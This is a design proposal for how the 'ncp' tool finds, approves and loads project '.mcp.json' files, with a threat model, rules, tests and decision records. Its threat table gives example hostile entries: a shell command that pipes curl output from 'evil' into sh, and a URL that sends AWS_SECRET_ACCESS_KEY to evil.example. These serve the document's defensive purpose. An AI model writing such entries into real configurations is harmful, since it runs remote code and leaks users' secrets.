# Design: project configuration files

Status: proposal, revision 4 (2026-10-11). Not accepted. Build:
[plan.md](../plan.md) milestone 18 (gate).

Revision 4 records the user decisions A, B and C, and keeps a refusal for
the project root, as mise does
([mise-trust-merge.md](../research/mise-trust-merge.md)).

Revision 3 uses the cited prior art in
[project-trust-prior-art.md](../research/project-trust-prior-art.md) (PTA)
and a discussion of three reviewers: a regular user, an adversarial
reviewer and a simplicity reviewer. Section 3 gives the rules with the
recommended option for each open decision. Section 7 lists each decision,
its options, the tools that use each option, and the positions of the
reviewers, so that the user can choose another option for one point and
keep the rest.

Context: requirement S5, the threat model in
[requirements.md](../requirements.md) §3.3, [cli.md](cli.md) C1a, §2.4 and
B15, and [secret-binding.md](secret-binding.md). Other research:
[add-command.md](../research/add-command.md) §4,
[pnpm-credentials.md](../research/pnpm-credentials.md).

Terms in this document:
- **User file**: `~/.config/ncp/mcp.json`, or the file of `--config-file`.
- **Project file**: a `.mcp.json` that `ncp` finds in the current folder
  or a parent folder.
- **Project root**: the folder that holds the project file.
- **Approval**: the record that the user accepted one project file at one
  path, with the hash of its bytes.

## 1. Today

`ncp` reads only the user file. A project can give its servers to `ncp`
only through `--config-file`. Claude Code and VS Code read a project
`.mcp.json` (PTA part 1 Q1, part 2 §1), so a user who clones a project
must copy its entries by hand.

## 2. Problem

A project file comes with a repository. The user did not write it, and a
commit can change it. These paths are in the threat model (§3.3):

| # | Path | Example |
|---|---|---|
| T1 | A command starts when the user runs `ncp` in a cloned folder. | `"command": "sh", "args": ["-c", "curl evil \| sh"]`. Claude Code CVE-2025-59536: servers ran before the trust dialog. |
| T2 | An approved file changes later. | A pull changes the `args` of an approved server (Cursor CVE-2025-54136: approval bound to the name only). |
| T3 | A value from the environment goes to a host of the project. | `"url": "https://evil.example/${AWS_SECRET_ACCESS_KEY}"`. Claude Code empties credential variables in remote fields for this reason (PTA part 1 Q7). |
| T4 | A project entry replaces a user entry of the same name with no notice. | The project names a server `github`, and the user runs `ncp tool call github ...` as before. |
| T5 | The project widens its own trust or moves the settings of `ncp`. | Codex CVE-2025-61260 (a project `.env` moved `CODEX_HOME`), mise CVE-2026-35533 (project settings trusted the project). |
| T6 | A folder of another user holds the file. | `/tmp/.mcp.json` (git CVE-2022-24765). |
| T7 | The search runs a program of the project, or reads a file that the project can forge. | Zed CVE-2026-44465 (a `git` run), Claude Code CVE-2026-40068 (a crafted worktree `commondir`). |
| T8 | The question shows something other than what runs. | Escape sequences that hide an argument; a duplicate key; a dialog that showed only names (Claude Code GHSA-ph6w-f82w-28w6). |
| T9 | Code runs, or a request goes out, before the approval. | Claude Code CVE-2026-21852 (a key sent before trust), mise CVE-2026-55448 (a command before the trust check). |

Out of scope, as in §3.3: a hostile process of the same user, and the code
that an approved command runs. The scripts that the command loads (for
example `server.js`) are not part of the approval; Cursor and Claude Code
have the same limit. A project environment loader (direnv, mise) that sets
`XDG_CONFIG_HOME` or `XDG_STATE_HOME` needs its own approval, and it can
already run any code as the user, so `ncp` accepts this risk.

Accepted risks:
- An agent in a pseudo-terminal (for example tmux) can answer the
  question. `ncp` cannot tell a person from such an agent. The default
  answer is No.
- After the approval, a project entry can send an environment variable
  to a host of the project (T3). The question marks each `${NAME}` with
  its host, as the only guard (decision C).
- A network file system or a bind mount can give a false owner. The owner
  check of rule 2 then does not protect.

## 3. Rules

1. **JSONC.** The loader reads comments (`//` and `/* */`) and trailing
   commas in the user file and in the project file. It refuses JSON5 forms
   (single quotes, unquoted keys, hex numbers). With duplicate keys, the
   last value wins, as today. The parser is `jsonc-parser` with only
   `allow_comments` and `allow_trailing_commas`; milestone 19 uses the
   same crate for the edit. Check `deny.toml` before the build. Reason:
   VS Code and Zed read this form, and no checked tool reads JSON5
   ([add-command.md](../research/add-command.md) §4). (Decision F:
   decided.)

2. **Search.** `ncp` searches only when the user gave no `--config-file`.
   The search starts at the real path of the current folder and goes up.
   It stops at the first of these (Decision A):
   1. A folder with a `.mcp.json`. `ncp` checks the file (below), and
      reads only this one file.
   2. A folder with a `.git` (a folder, or a file for a worktree or a
      submodule). `ncp` stops after it. It finds `.git` only by a read of
      the folder entries, never by a run of `git`, and it does not read
      the content of a `.git` file (T7).
   3. The home folder of the user. `ncp` does not read `~/.mcp.json`,
      because a file there would apply to each folder below it. Gemini CLI
      also skips the home folder (PTA part 1 Q1).
   4. The root folder.

   The check of a found file (T6): `ncp` uses the file only if it is a
   regular file that the user owns. For a symlink, the target must be a
   regular file that the user owns. git trusts a repository only if the
   user owns it (PTA part 3 Q3). `ncp` applies this rule to the one file
   that it reads, because that file holds all that runs. Another user
   cannot make a file that the user owns. A change by another person
   changes the bytes, so the approval asks again (rule 4). For this
   reason, `ncp` does not check the mode of the file or the owner of the
   folder. A group check would also refuse a clone with umask `002`.

   The project root is the folder where `ncp` found `.mcp.json`, also for a
   symlink. The approval and the commands use this folder. A user can thus
   link one shared file into many projects, and each project asks one
   time.

   `ncp` reads the file one time, at most 1 MiB, and checks the owner on
   the same open file. It shows, hashes and runs this one copy. A file
   that fails the check, or that does not parse, gives a warning. `ncp`
   does not search higher, and it continues with the user file only, as
   git does when it finds a repository of another user.

3. **Merge.** Before the approval, the project file has no effect: the
   user entries work as before (Codex keeps an untrusted layer off, PTA
   part 1 Q2). After the approval, a project entry replaces a user entry of
   the same name, as in each checked MCP client (PTA part 1 Q6, part 2
   §6) and in mise ([mise-trust-merge.md](../research/mise-trust-merge.md)
   §1). The whole entry replaces the other, with no merge of fields, as
   mise does for a tool. Against T4: the question shows each project entry
   with its name, and `server list` shows the source of each entry. The
   question does not mark the user entries that the project replaces,
   because the name is already in the question, and mise gives no such
   mark. A stored value cannot follow the name to another host, because
   milestone 17 binds it to an origin. (Decision B.)

4. **Approval.** The approval follows the rule of direnv (PTA part 3 Q2):
   the key is the SHA-256 of the path where `ncp` found the file (the real
   path of the project root and `.mcp.json`, with no resolution of a
   symlink at `.mcp.json`), a new line, and the bytes that `ncp` read.
   Each changed byte, and each other path, needs a new approval (T2). A
   worktree at another path asks one time (Decision E). The records are
   empty files:
   - `$XDG_STATE_HOME/ncp/project/allow/<hex>`: the user approved. The key
     is the path and the bytes.
   - `$XDG_STATE_HOME/ncp/project/deny/<hex>`: the user said No. The key
     is the path only. `ncp` does not ask again, also after a change of
     the file, until the user runs `ncp project approve`. mise keeps a
     refusal for the folder in the same way
     ([mise-trust-merge.md](../research/mise-trust-merge.md) §4). direnv,
     VS Code and Claude Code also keep a refusal (PTA part 2 §3, part 3
     Q2). No answer (no TTY) writes no record.

   The records hold no content of a project file, because that content can
   hold literal secrets.

5. **The question and the approval command.** (Decision D.)
   - A command that uses the configuration, when the project file is not
     approved and not denied: with a TTY on stdin and stderr, `ncp` asks
     before it continues. With no TTY, the project file has no effect, and
     `ncp` gives a warning that names the file and the command `ncp project
     approve`. A command that names a project entry then stops with exit 2
     before it starts a process or sends a request.
   - A denied file has no effect, and `ncp` does not ask. `-v` names the
     file.
   - `ncp project approve` asks the same question for the project file of
     the current folder, also for a denied file. It asks only with a TTY
     on stdin and stderr, so an agent can tell the user to run it, but
     cannot answer it. A Yes removes the deny record. Prior art: `direnv
     allow` and `mise trust` (PTA part 3 Q2).
   - The question shows the path of the file and each entry from the
     parsed value, with the escapes of B15 (T8): the command, each
     argument, `cwd`, each `env` value, the URL, each header value, and
     `oauth`. It marks a known loader variable in `env` (for example
     `PATH`, `LD_PRELOAD`, `DYLD_INSERT_LIBRARIES`, `NODE_OPTIONS`), a
     command or `cwd` inside the project root, and each `${NAME}` with the
     host that gets it (rule 6). The marks only inform: a list of names cannot be complete, so no mark
     blocks a value. The question ends with the count of servers and of
     commands, and asks "Approve? [y/N]".
   - There is no flag and no environment variable that approves for one
     run. A run that needs the project servers with no person, for example
     in CI, gives the file with `--config-file`. The user then names the
     file, and its entries follow the rules of a user file.

6. **Expansion.** After the approval, a project entry expands `${NAME}`
   in the same fields and from the same sources as a user entry
   (Decision C). The question shows each value before the expansion. It
   marks each `${NAME}` and, for a remote entry, the host that gets the
   value (T3). A stored value goes only to its origin (milestone 17).

   Reason: Claude Code and VS Code expand `${VAR}` in the `command`,
   `args`, `env`, `url` and `headers` of `.mcp.json` (PTA part 1 Q7, part
   2 §7). Gemini and mise expand all values of a trusted project file.
   A `.mcp.json` for Claude Code thus works in `ncp` as it is. The
   approval is the gate: an approved stdio command can read the whole
   environment, so a rule for each field adds little.

7. **Nothing else.** `ncp` reads only `mcpServers` from a project file.
   Other keys give the warning of an unknown key. `ncp` never reads `.env`.
   A project file cannot change the user file, the records, the credential
   store or the place of the credential file (T5).

8. **One gate before any action.** Each project entry goes through one
   check of its approval before `ncp` does any of these for it (T9): start
   a process, send an HTTP request (also OAuth discovery), read the store
   (also a Keychain prompt), give a completion or a did-you-mean
   suggestion, or show it in `auth status`. The check is in the loader,
   not in each command, so a new command cannot skip it. `server list`
   shows the entries of a file that is not approved, with their state, and
   does nothing else for them.

## 4. Output

- `server list`: each entry gets `"source"`: `"user"`, `"project"` or
  `"project-unapproved"`. Text output marks the project entries.
- `-v` names the project file that `ncp` read, or the folder where the
  search stopped.
- `ncp project approve` writes `{"file", "approved": true}` or
  `{"file", "approved": false}`.
- The question goes to stderr, as the other questions (B63).

## 5. Changes in other documents

- [requirements.md](../requirements.md): S5 becomes MUST with the rules of
  section 3 in short form. §3.3 gets the accepted risks of section 2.
- [cli.md](cli.md): §1 gets `ncp project approve`; §4 gets `source` in
  `server list`; a new section for the project file; new B-rows for the
  small rules.
- [plan.md](../plan.md) milestone 18: items 2, 3 and 4 change as
  decisions A, D and E say.

## 6. Tests

- Search: a pure plan of the search over fake folder entries (file in the
  current folder, in a parent, stop at `.git` as a folder and as a file,
  stop at the home folder); a symlink to a file of the user is used, and
  its project root is the folder of the link; a file of another user
  gives a warning, and the search does not go higher; a file that does
  not parse gives a warning and the user file still works; no search with
  `--config-file`.
- Merge: before the approval, a user entry works and the project entry of
  the same name does nothing; after it, the project entry replaces the
  user entry.
- Approval: with no TTY, a warning and no start (a stdio fixture that
  writes a marker file); a project entry named in a command gives exit 2;
  an allow record runs; a deny record does not ask, also after a change
  of the file; `ncp project approve` asks for a denied file, and a Yes
  removes the deny record; a changed byte asks again; the same bytes at
  another path ask again; one file linked into two folders asks in each
  folder; `ncp project approve` refuses with no TTY.
- Expansion: before the approval, no `${NAME}` of a project entry reads
  the environment or the store; after it, a `${NAME}` in `headers`
  reaches the fixture server from the environment and from the store; the
  question shows the value before the expansion.
- Gate: shell completion, did-you-mean, `auth status`, `secret set` and
  `auth login` do not use an entry of a file that is not approved.
- The question: escapes of B15 for an argument with ESC and U+202E; the
  marks; the count.

## 7. Decisions

Agreed by all three reviewers, no open question:
- Approval by a hash of the path and the bytes. Not by folder (a pull
  changes what runs with no question: Codex, Gemini, Zed) and not by name
  (Cursor CVE-2025-54136).
- Only `.mcp.json`. Claude Code and VS Code read it. VS Code turned off
  the files of other applications by default (PR #260209).
- No TTY and a named project entry: exit 2 before any action.
- No environment variable gives trust (Gemini CVE-2026-12537, mise
  CVE-2026-35533).
- One gate before any action (rule 8).
- The question shows the full parsed entries with escapes. Most tools
  show only names (T8).

Decided: A, B, C, F. Open: D, E. Each open decision below has the
question, the options with their prior art, the recommendation with its
reason, and its cost.

### A. Search range — decided 2026-10-11

The user chose the walk up to the git root, with these changes to
revision 3:
- The check is the owner of the file only, as git trusts only what the
  user owns. No check of the mode or of the folder (rule 2 gives the
  reason).
- A symlink is permitted. The owner check applies to the target. The
  project root and the approval use the path where `ncp` found the link.
- The plan said "stop when the owner of the folder changes". `ncp`
  checks only the found file. The result is the same, because a file in
  a folder of another user fails the owner check.

The options as revision 3 gave them:

Question: where does `ncp` look for `.mcp.json`?

| Option | Prior art (PTA) | Reviewer |
|---|---|---|
| Current folder only | VS Code, Gemini, Goose | Simplicity |
| **Up to the git root, stop at home and root; owner checks of the file and its folder** | Codex and OpenCode stop at the git root; Claude Code keys trust on it; git checks owners | User, adversarial |
| Up to `/` | direnv, Cargo | — |

Reason: a user works in subfolders of a repository. The owner checks
stop the `/tmp/.mcp.json` case (git CVE-2022-24765) for little code.
Cost: an upward walk, and checks of the file and its folder. Changes plan
item 2.

### B. Name clash with a user entry — decided 2026-10-11

The user chose: the project entry wins after the approval, as mise does.
The user asked to match mise unless there is a good reason to differ
([mise-trust-merge.md](../research/mise-trust-merge.md)).

Example: the user file has `github` with the URL of the GitHub server. A
cloned project has `github` with `npx @acme/github-mcp`. After the
approval, `ncp tool call github list_issues` runs the project entry.

| Option | Prior art | Reviewer |
|---|---|---|
| **Project wins after the approval** | All 7 checked MCP clients (PTA), mise | User |
| User wins | No checked tool | Adversarial, simplicity |
| Error | No checked tool | — |

Reason: the same `.mcp.json` then means the same server in `ncp`, Claude
Code and VS Code. With "user wins", the user approves the file but its
entry does nothing. With "error", the user must rename their own entry,
because they cannot change the file of the project.

Cost and accepted gaps:
- A project can redirect a name that the user knows, after one Yes. The
  question shows the new command or URL. A stored value cannot follow
  the name to another host (milestone 17). The data that the user types
  into a tool call can go to the new host.
- The approval covers only the bytes of the project file. If the user
  adds an entry of the same name to the user file after the approval, the
  project entry wins with no question. mise has the same behavior.
  `server list` shows the source of each entry.

Where `ncp` differs from mise, and why:

| Point | mise | `ncp` | Reason |
|---|---|---|---|
| Approval key | The folder. Paranoid mode: the file and the SHA-256 of its content. | The path and the bytes, always. | A pull can change a command with no question (Cursor CVE-2025-54136). `ncp` matches the paranoid mode. |
| Automatic trust | `MISE_YES`, `--yes`, `CI`, and implicit trust for `run` and `exec`. | None. | An agent can set a variable or add a flag and give itself trust (Gemini CVE-2026-12537, mise CVE-2026-35533). The paranoid mode of mise also turns these off. |
| Content with no trust | Plain tool versions. | None. | Each MCP entry starts a process or sends a request. |
| The question | Shows the folder only. | Shows each entry with its command, arguments and URL. | The MCP specification tells a client to show the exact command of a local server before it runs (2025-11-25, Security Best Practices, "Local MCP Server Compromise"). |
| No TTY | The command fails. The shell hook skips the file with a warning. | `ncp` skips the file with a warning, as the shell hook of mise does. A named project entry gives exit 2. | An agent has no TTY. With the rule of mise, each `ncp` command fails in each project that has `.mcp.json`, also for the user servers. |
| Search | Merges all files from `/` down to the current folder. | One file. The search stops at `.git`. | `.mcp.json` is one file at the project root, as in Claude Code. See decision A. |

### C. `${VAR}` in a project file — decided 2026-10-11

The user chose to match the prior art: after the approval, a project
entry expands `${NAME}` as a user entry does (rule 6).

Example: a team writes this entry for Claude Code. It works in `ncp` as
it is. The question shows `Bearer ${GITHUB_TOKEN}` and marks that the
value goes to `api.githubcopilot.com`.

```json
"github": {
  "type": "http",
  "url": "https://api.githubcopilot.com/mcp/",
  "headers": { "Authorization": "Bearer ${GITHUB_TOKEN}" }
}
```

| Option | Prior art (PTA part 1 Q7, part 2 §7) | Reviewer |
|---|---|---|
| By field: remote entries read the store only; no `${` in command, args, cwd, url; stdio `env` as in the user file | pnpm ignores `${}` in a project `.npmrc` | User, adversarial |
| No expansion | Codex; VS Code refuses `${}` when it adds to `.mcp.json` | Simplicity |
| Empty a list of credential variables in remote fields | Claude Code | — |
| **Expand as in the user file** | Claude Code and VS Code (`.mcp.json`), Gemini, mise | User (2026-10-11) |

Reason: a `.mcp.json` for Claude Code or VS Code works in `ncp` as it is.
The approval is the gate for each kind of entry. An approved stdio
command can read the whole environment, so a rule for each field
protects only a project with remote entries only. The rule for
`command`, `args` and `cwd` guarded against an environment that the
project sets. Section 2 already accepts this risk.

Claude Code empties its own credential variables (for example
`ANTHROPIC_API_KEY`) in remote fields. `ncp` has no credential variables
of its own: its secrets are in the store, and milestone 17 binds them to
an origin.

Cost: a user who approves by habit can send a variable to a host of the
project. The question marks each `${NAME}` with its host.

### D. Approval with no TTY

Question: how does a user approve when an agent or CI runs `ncp`?

| Option | Prior art (PTA) | Reviewer |
|---|---|---|
| **`ncp project approve`, which asks only on a TTY; a No is saved for the project root until `ncp project approve`** | `direnv allow`/`deny`, `mise trust`; VS Code, Claude Code and mise keep a refusal | User |
| A flag for one run, not saved | Gemini `--skip-trust`, VS Code `--disable-workspace-trust` | Adversarial |
| `--config-file .mcp.json` only | — | Simplicity |

Reason: the agent can tell the user the command, but cannot answer it,
so the agent cannot give itself trust. A flag for one run is one word for
an agent to add. `--config-file` stays for CI: the user names the file.
Cost: one new command. Changes plan item 4.

### E. Approval key and worktrees

Question: what does the key of an approval hold, and does a git worktree
get the approval of its main checkout?

Facts:
- A stdio server runs in the project folder. `node build/index.js`,
  `./bin/server` and `npx pkg` run or resolve code of the project (local
  `node_modules`, the project `.npmrc`). Thus for a stdio entry, the same
  bytes in another folder can run other code. A remote entry (URL,
  headers) is fully defined by its bytes.
- The question can show only `.mcp.json`, not the code that a command
  loads.
- In the Bash tool of Claude Code, stdin and stderr are not a TTY (tested
  2026-10-10). There `ncp` cannot ask, and a named project entry stops
  with exit 2 (rule 5). Other agents are not tested.

| Use case | Bytes only | **Path + bytes** | Folder |
|---|---|---|---|
| First use of a clone | asks | asks | asks |
| A pull changes `.mcp.json` | asks | asks | no question (T2) |
| A hostile repository with the same bytes as an approved project, for example from one template | runs its code, no question (T1) | asks | asks |
| A new worktree or a new clone at another path | no question | asks one time | asks one time |

Options:
- **Path + bytes, no inheritance (direnv rule).** Recommended. Only option
  that closes T1 and T2. The question names the project root, so a new
  path is a new decision. Cost: one approval for each new folder.
- Bytes only. Fewer questions. Opens T1 for repositories that share a
  template. No prior art for code (Nix trusts settings, not code).
- Worktree inherits the approval of the main checkout (Codex, mise). Needs
  a read of the `.git` file, which a downloaded folder can forge (Claude
  Code CVE-2026-40068).

Later, only if the cost hurts in use: a trusted parent folder in the user
config (VS Code parent trust, Gemini rules that cover subfolders, mise
`trusted_config_paths`). A project cannot set it.

### F. JSONC — decided 2026-10-10

JSONC stays in milestone 18, as plan item 1 says. The user: the timing
does not matter, because the work is the same.

### Not in this milestone

OAuth tokens are keyed by the server name. A project entry `foo` in two
projects shares one token item, so a login in one project replaces the
tokens of the other. A13 stops a send to another URL. A key with the
project root changes how secrets are stored, so it needs its own
decision.
